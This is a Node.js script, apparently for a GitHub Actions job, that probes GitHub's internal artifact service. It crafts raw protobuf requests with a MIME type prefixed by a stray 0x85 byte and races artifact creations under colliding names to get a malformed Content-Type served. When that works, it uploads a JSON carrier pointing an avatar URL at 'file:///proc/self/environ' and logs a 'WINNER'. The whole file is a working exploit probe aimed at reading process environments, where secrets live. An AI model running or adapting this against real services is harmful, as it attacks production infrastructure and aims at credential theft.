import {createHash} from 'node:crypto';
import https from 'node:https';

// This is a bounded diagnostic. It does not claim that GitHub accepts either
// malformed protobuf strings or colliding artifact names.
const required = ['ACTIONS_RESULTS_URL', 'ACTIONS_RUNTIME_TOKEN', 'GITHUB_REPOSITORY', 'GITHUB_RUN_ID'];
for (const name of required) {
  if (!process.env[name]) throw new Error(`Missing ${name}; run this as a GitHub Actions job`);
}

const [{BlobClient}, {internalArtifactTwirpClient}, {getBackendIdsFromToken},
  {CreateArtifactResponse, StringValue}] = await Promise.all([
  import('@azure/storage-blob'),
  import('./node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js'),
  import('./node_modules/@actions/artifact/lib/internal/shared/util.js'),
  import('./node_modules/@actions/artifact/lib/generated/index.js'),
]);

const ids = getBackendIdsFromToken();
const client = internalArtifactTwirpClient({maxAttempts: 1});
const endpoint = new URL(
  '/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact',
  process.env.ACTIONS_RESULTS_URL,
);
const prefix = `ra-probe-${process.env.GITHUB_RUN_ID}`;
const plainMime = 'application/json';
const oddMime = '\u0085application/json';
const rawOddMime = Buffer.concat([Buffer.from([0x85]), Buffer.from(plainMime)]);
const placeholder = Buffer.from('{"probe":"artifact-mime"}');
const placeholderHash = `sha256:${createHash('sha256').update(placeholder).digest('hex')}`;
let createRequests = 0;
const winners = [];

function errorKind(error) {
  const message = String(error?.message || error).toLowerCase();
  if (message.includes('already exists') || message.includes('conflict')) return 'conflict';
  if (message.includes('invalid')) return 'invalid';
  if (message.includes('not found')) return 'not_found';
  const tag = String(error?.code || error?.name || 'request_failed');
  return /^[A-Za-z0-9_]{1,48}$/.test(tag) ? tag : 'request_failed';
}

function varint(value) {
  let n = BigInt(value);
  const out = [];
  do {
    let byte = Number(n & 127n);
    n >>= 7n;
    if (n) byte |= 128;
    out.push(byte);
  } while (n);
  return Buffer.from(out);
}

function bytesField(number, value) {
  const bytes = Buffer.isBuffer(value) ? value : Buffer.from(value);
  return Buffer.concat([varint(number * 8 + 2), varint(bytes.length), bytes]);
}

function rawCreateBody(name, version) {
  return Buffer.concat([
    bytesField(1, ids.workflowRunBackendId),
    bytesField(2, ids.workflowJobRunBackendId),
    bytesField(3, name),
    Buffer.concat([varint(5 * 8), varint(version)]),
    bytesField(6, bytesField(1, rawOddMime)),
  ]);
}

async function createRaw(name, version) {
  createRequests++;
  try {
    const response = await fetch(endpoint, {
      method: 'POST',
      headers: {
        authorization: `Bearer ${process.env.ACTIONS_RUNTIME_TOKEN}`,
        'content-type': 'application/protobuf',
        accept: 'application/protobuf',
      },
      body: rawCreateBody(name, version),
    });
    if (!response.ok) {
      // Do not print the error body: it might echo a signed URL or credential.
      return {ok: false, status: response.status};
    }
    const data = CreateArtifactResponse.fromBinary(Buffer.from(await response.arrayBuffer()));
    return {ok: Boolean(data.ok && data.signedUploadUrl), status: response.status,
      url: data.signedUploadUrl || undefined};
  } catch (error) {
    return {ok: false, error: errorKind(error)};
  }
}

async function createNormal(name, version, mimeType) {
  createRequests++;
  try {
    const data = await client.CreateArtifact({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name, version, mimeType: StringValue.create({value: mimeType}),
    });
    return {ok: Boolean(data.ok && data.signedUploadUrl), url: data.signedUploadUrl || undefined};
  } catch (error) {
    return {ok: false, error: errorKind(error)};
  }
}

async function upload(url, bytes) {
  if (!url) return {ok: false, error: 'no_upload_url'};
  try {
    await new BlobClient(url).getBlockBlobClient().uploadData(bytes, {
      blobHTTPHeaders: {blobContentType: plainMime},
    });
    return {ok: true};
  } catch (error) {
    return {ok: false, error: errorKind(error)};
  }
}

async function finalize(name) {
  try {
    const data = await client.FinalizeArtifact({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name, size: String(placeholder.length),
      hash: StringValue.create({value: placeholderHash}),
    });
    return {ok: true, id: String(data.artifactId)};
  } catch (error) {
    return {ok: false, error: errorKind(error)};
  }
}

async function inspect(name) {
  try {
    const data = await client.GetSignedArtifactURL({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name,
    });
    const url = new URL(data.signedUrl);
    // Node's HTTP parser exposes header bytes as Latin-1. This matters here:
    // UTF-8 C2 85 is not equivalent to the required single byte 85.
    const response = await new Promise((resolve, reject) => {
      const request = https.get(url, {timeout: 15000}, incoming => {
        const chunks = [];
        incoming.on('data', chunk => chunks.push(chunk));
        incoming.on('end', () => resolve({
          status: incoming.statusCode,
          body: Buffer.concat(chunks),
          contentType: incoming.headers['content-type'] || '',
          contentTypeLines: incoming.rawHeaders.filter((value, index) =>
            index % 2 === 0 && value.toLowerCase() === 'content-type').length,
        }));
        incoming.on('error', reject);
      });
      request.on('timeout', () => request.destroy(new Error('timeout')));
      request.on('error', reject);
    });
    return {
      ok: response.status >= 200 && response.status < 300,
      status: response.status, url: data.signedUrl, body: response.body,
      rsctHex: Buffer.from(url.searchParams.get('rsct') || '', 'latin1').toString('hex'),
      contentTypeHex: Buffer.from(response.contentType, 'latin1').toString('hex'),
      contentTypeLines: response.contentTypeLines,
    };
  } catch (error) {
    return {ok: false, error: errorKind(error)};
  }
}

function printable(value) {
  return {
    ok: value?.ok ?? false,
    status: value?.status,
    error: value?.error,
    id: value?.id,
    rsctHex: value?.rsctHex,
    contentTypeHex: value?.contentTypeHex,
    contentTypeLines: value?.contentTypeLines,
    bytes: value?.body?.length,
  };
}

function hasBareNelJson(value) {
  if (!value?.ok || !value.contentTypeHex) return false;
  const bytes = Buffer.from(value.contentTypeHex, 'hex');
  if (bytes[0] !== 0x85) return false;
  return /^application\/json(?:;|$)/i.test(bytes.subarray(1).toString('latin1'));
}

async function tryCarrier(label, viewName, views, uploads, idsFound) {
  const candidate = views.find(item => item.name === viewName)?.view;
  if (!hasBareNelJson(candidate)) return;
  for (const artifactId of [...new Set(idsFound.filter(Boolean))]) {
    const repository = `${process.env.GITHUB_REPOSITORY}/actions/artifacts/${artifactId}/zip`;
    const body = Buffer.from(JSON.stringify({
      full_name: repository,
      owner: {avatar_url: 'file:///proc/self/environ'},
    }));
    await Promise.all(uploads.filter(Boolean).map(url => upload(url, body)));
    const after = await inspect(viewName);
    if (hasBareNelJson(after) && after.body?.equals(body)) {
      const winner = {label, artifactId, repository, contentTypeHex: after.contentTypeHex};
      winners.push(winner);
      console.log(`WINNER ${JSON.stringify(winner)}`);
      break;
    }
  }
}

async function runRaw(version) {
  const name = `${prefix}-raw-v${version}`;
  const created = await createRaw(name, version);
  const saved = created.ok ? await upload(created.url, placeholder) : {ok: false};
  const final = saved.ok ? await finalize(name) : {ok: false};
  const view = final.ok ? await inspect(name) : {ok: false};
  console.log(`RAW ${JSON.stringify({version, name, created: printable(created),
    uploaded: printable(saved), finalized: printable(final), view: printable(view)})}`);
  if (hasBareNelJson(view)) {
    await tryCarrier(`raw-v${version}`, name, [{name, view}], [created.url], [final.id]);
  }
}

async function runCollision(label, firstName, secondName, reverse) {
  const firstVersion = reverse ? 7 : 6;
  const secondVersion = reverse ? 6 : 7;
  const [first, second] = await Promise.all([
    createNormal(firstName, firstVersion, firstVersion === 6 ? oddMime : plainMime),
    createNormal(secondName, secondVersion, secondVersion === 6 ? oddMime : plainMime),
  ]);
  const saved = await Promise.all([upload(first.url, placeholder), upload(second.url, placeholder)]);
  const finals = await Promise.all([
    saved[0].ok ? finalize(firstName) : {ok: false},
    saved[1].ok ? finalize(secondName) : {ok: false},
  ]);
  const names = [...new Set([firstName, secondName])];
  const views = await Promise.all(names.map(async name => ({name, view: await inspect(name)})));
  console.log(`COLLISION ${JSON.stringify({label, reverse, names,
    created: [printable(first), printable(second)],
    uploaded: saved.map(printable), finalized: finals.map(printable),
    views: views.map(item => ({name: item.name, ...printable(item.view)}))})}`);
  for (const item of views) {
    if (hasBareNelJson(item.view)) {
      await tryCarrier(label, item.name, views, [first.url, second.url], finals.map(x => x.id));
    }
  }
}

await runRaw(6);
await runRaw(7);
const variants = [
  ['case', base => [base + '-Case', base + '-case']],
  ['nfc', base => [base + '-caf\u00e9', base + '-cafe\u0301']],
  ['dot', base => [base + '-dot', base + '-dot.']],
  ['space', base => [base + '-space', base + '-space ']],
];
for (const [label, names] of variants) {
  for (const reverse of [false, true]) {
    const [firstName, secondName] = names(`${prefix}-${label}-${Number(reverse)}`);
    await runCollision(label, firstName, secondName, reverse);
  }
}
if (createRequests >= 30) throw new Error('CreateArtifact request cap exceeded');
console.log(`SUMMARY ${JSON.stringify({createRequests, winners})}`);
